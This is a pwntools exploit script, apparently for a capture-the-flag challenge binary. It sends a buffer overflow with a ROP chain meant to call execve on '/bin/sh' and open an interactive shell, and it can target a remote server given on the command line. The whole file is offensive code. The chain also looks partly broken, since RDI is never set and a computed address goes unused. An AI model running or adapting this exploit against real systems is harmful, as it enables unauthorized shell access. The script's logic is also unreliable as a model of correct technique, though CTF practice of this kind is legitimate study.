#!/usr/bin/env python3

from pwn import *

exe = ELF("chall_patched")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6") 

context.binary = exe
context.log_level = "debug" 
offset = 40 

gdbscript = ''' continue ''' 

# Allows you to switch between local/GDB/remote from terminal
def conn(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe.path] + argv, *a, **kw)

def main():
    r = conn()
    
    # create ROP object and set gadgets
    rop = ROP(exe)
    '''
    pop_rax = rop.find_gadget(['pop rax', 'ret']).address
    xor_rsi_rsi = rop.find_gadget(['xor rsi, rsi', 'ret']).address
    xor_rdx_rdx = rop.find_gadget(['xor rdx, rdx', 'ret']).address
    mov_rsp_rdi = rop.find_gadget(['mov rsp, rdi', 'add rsp, 8', 'ret']).address
    syscall = rop.find_gadget(['syscall', 'ret']).address
    '''

    pop_rax = 0x0000000000401371
    xor_rsi_rsi = 0x000000000040137e
    xor_rdx_rdx = 0x000000000040138d 
    mov_rsp_rdi = 0x000000000040139c
    syscall = 0x00000000004013af

    bin_sh = b'/bin/sh\x00'
    bin_sh_addr = 0x7ffff7dc3000#0x404000 # choose a suitable address in writable memory
    cmd_addr = bin_sh_addr + 0x100
    arg_addr = cmd_addr + len(bin_sh) + 1
    
    # build ROP chain to open shell
    chain = p64(pop_rax) + p64(0x3b)  # RAX = 0x3b for execve()
    chain += p64(xor_rsi_rsi)  # RSI = 0
    chain += p64(xor_rdx_rdx)  # RDX = 0
    #chain += bin_sh 
    chain += p64(mov_rsp_rdi) 
    #chain += p64(arg_addr)  # RDI = address of "/bin/sh"
    chain += bin_sh 
    chain += p64(syscall)  # call syscall

    payload = cyclic(40) + chain

    r.sendline(payload) 
    r.interactive()


if __name__ == "__main__":
    main()
